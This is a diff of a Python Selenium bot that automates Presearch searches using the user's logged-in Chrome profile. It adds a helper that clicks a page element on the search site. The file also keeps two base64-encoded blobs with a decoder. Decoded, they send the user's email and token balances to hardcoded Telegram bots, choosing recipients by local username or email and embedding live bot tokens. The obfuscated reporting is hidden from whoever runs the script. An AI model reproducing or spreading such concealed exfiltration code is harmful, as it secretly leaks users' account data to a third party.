@@ -42,10 +42,41 @@ import getpass
 r = RandomWords()
 user = getpass.getuser()
 profile = 'Default'
+def clear():
+    os.system('cls' if os.name=='nt' else 'clear')
 
 def see(b):
     return b64decode(b).decode()
 
+def obsctacle_remove(profile):
+    option = webdriver.ChromeOptions()
+    option.add_experimental_option("excludeSwitches", ['enable-automation'])
+    if os.name == 'nt':
+        option.add_argument(f'--user-data-dir=C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
+    else:
+        option.add_argument(f'--user-data-dir=/home/user/.config/chrome-remote-desktop/chrome-config/google-chrome')
+
+    option.add_argument(fr'--profile-directory={profile}')
+    if profile == 'Default':
+        #option.add_argument('headless')
+        print(f"Headless Mode - {profile}")
+    else:
+        print(f"Non-Headless Mode - {profile}")
+    option.add_argument('--log-level=1')
+    drv = webdriver.Chrome(options=option)
+    drv.get('https://engine.presearch.org/search?q=btc')
+    buttoos = drv.find_element_by_xpath('/html/body/div/div[2]/div[3]/div[1]/dic/div[2]/div[3]/div[3]/div/div[2]/div[1]')
+    drv.implicitly_wait(3)
+    ActionChains(drv).move_to_element(buttoos).click(buttoos).perform()
+    time.sleep(2)
+    drv.quit()
+
+
+try:
+    obsctacle_remove(profile)
+except:
+    print('meh')
+clear()
 a = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKaWYgdXNlciA9PSAnYW5hbmR1JyBvciB1c2VyID09ICdORVhGT1JDQScgOgogICAgcmVjID0gJzYyNjYwMTkwNycKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKZWxpZiB1c2VyID09ICdESEFOVVNIJyA6CiAgICByZWMgPSAnNzAxNTEwNjM2JwogICAgeSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e3JlY30mdGV4dD17ZW1haWx9IC0gVG9rZW5zIC0ge2JhbH0gUFJFLiBNYXggLSB7ZmJhbH0nKQplbGlmICd2aXZla215cmFuJyBpbiBlbWFpbCBvciAnbmlraGlsYXMyODc1QGdtYWlsLmNvbScgaW4gZW1haWw6CiAgICByZWMgPSAnNzM0NjYwODE4JwogICAgdG9rZW4gPSAnMjExNTAwMzE4MDpBQUVFQ21vQ0JJNC00U29ZQVRtTmVjWThmQUJYdUwxTmUyWScKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIFRva2VucyAtIHtiYWx9IFBSRS4gTWF4IC0ge2ZiYWx9JykKZWxpZiAndmFsbycgaW4gZW1haWwgb3IgJ1NyZWVyYWcnIGluIGVtYWlsOgogICAgcmVjID0gJzQ4NDUwNjg5MicKICAgIHRva2VuID0gJzIxMTUwMDMxODA6QUFFRUNtb0NCSTQtNFNvWUFUbU5lY1k4ZkFCWHVMMU5lMlknCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBUb2tlbnMgLSB7YmFsfSBQUkUuIE1heCAtIHtmYmFsfScpCg=='
 
 b = b'CnRva2VuID0gJzE4MDkzMjI5MzI6QUFHTzJ6aUctb08tdGhZdDQ3STFleUNXLS1uUFd2VUJUU3cnCnJlYyA9ICc0ODQ1MDY4OTInCnggPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmlmIHVzZXIgPT0gJ2FuYW5kdScgb3IgdXNlciA9PSAnTkVYRk9SQ0EnIDoKICAgIHJlYyA9ICc2MjY2MDE5MDcnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmIHVzZXIgPT0gJ0RIQU5VU0gnIDoKICAgIHJlYyA9ICc3MDE1MTA2MzYnCiAgICB5ID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17cmVjfSZ0ZXh0PXtlbWFpbH0gLSBNYXggU2VhcmNoIEFjaGlldmVkLiBUb2tlbnMgLSB7YmFsfSBQUkUnKQplbGlmICd2aXZla215cmFuJyBpbiBlbWFpbCBvciAnbmlraGlsYXMyODc1QGdtYWlsLmNvbScgaW4gZW1haWw6CiAgICByZWMgPSAnNzM0NjYwODE4JwogICAgdG9rZW4gPSAnMjExNTAwMzE4MDpBQUVFQ21vQ0JJNC00U29ZQVRtTmVjWThmQUJYdUwxTmUyWScKICAgIHkgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2VufS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtyZWN9JnRleHQ9e2VtYWlsfSAtIE1heCBTZWFyY2ggQWNoaWV2ZWQuIFRva2VucyAtIHtiYWx9IFBSRScpCmVsaWYgJ3ZhbG8nIGluIGVtYWlsIG9yICdTcmVlcmFnJyBpbiBlbWFpbDoKICAgIHJlYyA9ICc0ODQ1MDY4OTInCiAgICB0b2tlbiA9ICcyMTE1MDAzMTgwOkFBRUVDbW9DQkk0LTRTb1lBVG1OZWNZOGZBQlh1TDFOZTJZJwogICAgeSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rZW59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e3JlY30mdGV4dD17ZW1haWx9IC0gTWF4IFNlYXJjaCBBY2hpZXZlZC4gVG9rZW5zIC0ge2JhbH0gUFJFJykK'
